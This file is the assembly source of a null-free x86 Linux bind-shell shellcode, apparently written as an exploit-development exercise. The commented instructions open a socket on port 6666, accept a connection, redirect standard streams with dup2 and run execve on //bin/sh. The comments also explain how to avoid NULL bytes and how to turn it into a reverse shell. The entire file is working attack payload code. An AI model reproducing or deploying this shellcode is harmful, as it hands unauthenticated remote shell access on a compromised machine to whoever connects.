; port is 6666
; length is Length is 125
; NULL free

global _start

section .text

_cleanupA:
xor eax , eax ; cleaning
ret ; Of course here we have to return or else it will crashs our flow
_start:
call _cleanupA ; we used call becuase we want to transfer the control to the label cleanup and then return from there using ret instrucation
mov al, 102 ; set al to the value of 102 which is the value of socketcall
mov bl ,1 ; set the value of bl to 1 since we need it to call SYS_SOCKET socket() if we used ebx or bx instead of bl it will result in a NULL which is something that we trry to avoid
; 8048070: 66 bb 01 00 mov $0x1,%bx BAD NULL ^_^

push BYTE 6
push BYTE 1 
push BYTE 2
lea ecx, [esp] ; ECX - PTR to arguments for socket()
int 0x80
lea si, [eax] ; save socket fd in ESI for later we can use lean instead of this operation but it will result in different size

; REMEMBER use as much as possaible of the smallest registers to avoid NULLSSSSSS

jmp HookRet ; here we used jmp instead if jmp sort or call to avoid NULLS


_InitPort:
pop edi ; 
push BYTE 102
pop ax ; use ax not eax to get less size definding the socketcall
add ebx , 1 ; or we can use increment to get SYS_BIND bind()
imul dx , dx
push dx ; 0 = ANY HOST (0.0.0.0)} || struct in_addr sin_addr (unsigned long s_addr) };
push WORD [edi] ; PORT specified in the bottom of the code / shellcode. Last two bytes in HEX.
push WORD bx ; 2 = AF_INET || struct sockaddr { short sin_family,
lea ecx, [esp] ; Save PTR to sockaddr struct in ECX
push BYTE 16 ; socklen_t addrlen);
push ecx ; const struct sockaddr *addr,
push esi ; bind(int sockfd,
mov ecx, esp ; ECX = PTR to arguments for bind()
int 0x80
mov BYTE al, 102 ; socketcall
add ebx , 2 ; = SYS_LISTEN listen()
push BYTE 1 ; int backlog);
push esi ; listen(int sockfd,
mov ecx, esp ; ECX = PTR to arguments for listen()
int 0x80

; remote this if we want to convert it to a reverse shellcode

mov BYTE al, 102 ; socketcall
add ebx , 1 ; which is in total 5 which is SYS_ACCEPT = accept()
push edx ; socklen_t *addrlen = 0);
push edx ; *addr = NULL,
push esi ; listen()
mov ecx, esp ; take the args from esp and store it inti ecx 
int 0x80

; dup2 to duplicate sockfd, that will attach the client to a shell
; that we'll spawn below in execve syscall
xchg eax, ebx ; after EBX = sockfd, EAX = 5
push BYTE 2
pop ecx
L0000p:
mov BYTE al, 63
int 0x80
sub ecx , 1
jns L0000p


call _cleanupA
push eax
push 0x68732f6e ; push 0x68736164 then push 0x2F6E to change from /bin/sh to //bin/dash
push 0x69622f2f
mov ebx, esp
push eax

mov edx, esp ; ESP is now pointing to EDX
push ebx
lea ecx, [esp] ; save the content of ESP into the ECX before we clean it up
mov al, 11 ; execve MAY USE EXECL OR ANY OTHERS OF SAME TYPE
int 0x80

HookRet:
call _InitPort
db 0x1a, 0x0a
ret

 
